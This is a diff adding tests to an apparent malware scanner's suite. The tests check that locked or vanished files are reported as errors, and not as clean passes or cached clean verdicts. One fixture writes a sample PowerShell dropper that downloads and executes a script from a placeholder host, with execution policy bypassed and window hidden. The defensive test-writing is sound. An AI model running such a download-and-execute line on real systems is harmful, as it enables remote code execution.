@@ -343,6 +343,71 @@ class TestScanner:
         assert verdict.name == "Trojan.Test.Known"
         assert any(d.conclusive for d in verdict.detections)
 
+    def test_vanished_file_is_an_error_not_a_clean_pass(
+        self, scanner, tmp_path: Path
+    ) -> None:
+        # Hashing is the first thing that opens the file, so a file that is
+        # locked or removed between enumeration and scanning fails there. If
+        # that is not caught, every content detector sees nothing and the
+        # file is reported clean — a silent miss dressed up as a pass, which
+        # is the worst failure shape a scanner has.
+        missing = tmp_path / "gone.exe"
+        verdict = scanner.scan_file(missing)
+
+        assert verdict.error
+        assert not verdict.detections
+        # "We could not read this" is a different answer from "this is fine",
+        # and the score must not imply we looked.
+        assert verdict.score == 0.0
+
+    def test_unreadable_file_counts_as_an_error(
+        self, scanner, tmp_path: Path, monkeypatch
+    ) -> None:
+        from sentinel.engine.detectors import base
+        from sentinel.utils.hashing import HashError
+
+        directory = tmp_path / "locked"
+        directory.mkdir()
+        target = directory / "in-use.dat"
+        target.write_bytes(b"content another process holds open" * 40)
+
+        def refuse(path: Path, *args, **kwargs):
+            raise HashError(f"cannot hash {path}: locked by another process")
+
+        monkeypatch.setattr(base, "hash_file_multi", refuse)
+
+        result = scanner.scan_paths([directory])
+        assert result.errors == 1
+        # ClamAV's convention: 2 means the scan could not answer, which is
+        # not the same answer as 0 (clean).
+        assert result.exit_code() == 2
+
+    def test_unreadable_file_is_not_cached_as_clean(
+        self, scanner, tmp_path: Path, monkeypatch
+    ) -> None:
+        # Caching a failed read would make the miss permanent: every later
+        # scan would skip the file on the strength of a verdict we never
+        # actually reached.
+        from sentinel.engine.detectors import base
+        from sentinel.utils.hashing import HashError, hash_file_multi
+
+        target = tmp_path / "dropper.ps1"
+        target.write_text(
+            "$c = New-Object Net.WebClient\n"
+            "IEX $c.DownloadString('http://example.invalid/x')\n"
+            "powershell -ExecutionPolicy Bypass -WindowStyle Hidden\n",
+            encoding="utf-8",
+        )
+
+        def refuse(path: Path, *args, **kwargs):
+            raise HashError("temporarily locked")
+
+        monkeypatch.setattr(base, "hash_file_multi", refuse)
+        assert scanner.scan_file(target).error
+
+        monkeypatch.setattr(base, "hash_file_multi", hash_file_multi)
+        assert scanner.scan_file(target).is_threat
+
     def test_events_are_emitted(self, scanner, recorder, corpus: Path) -> None:
         scanner.scan_paths([corpus])
         assert recorder.count(EventType.SCAN_STARTED) == 1
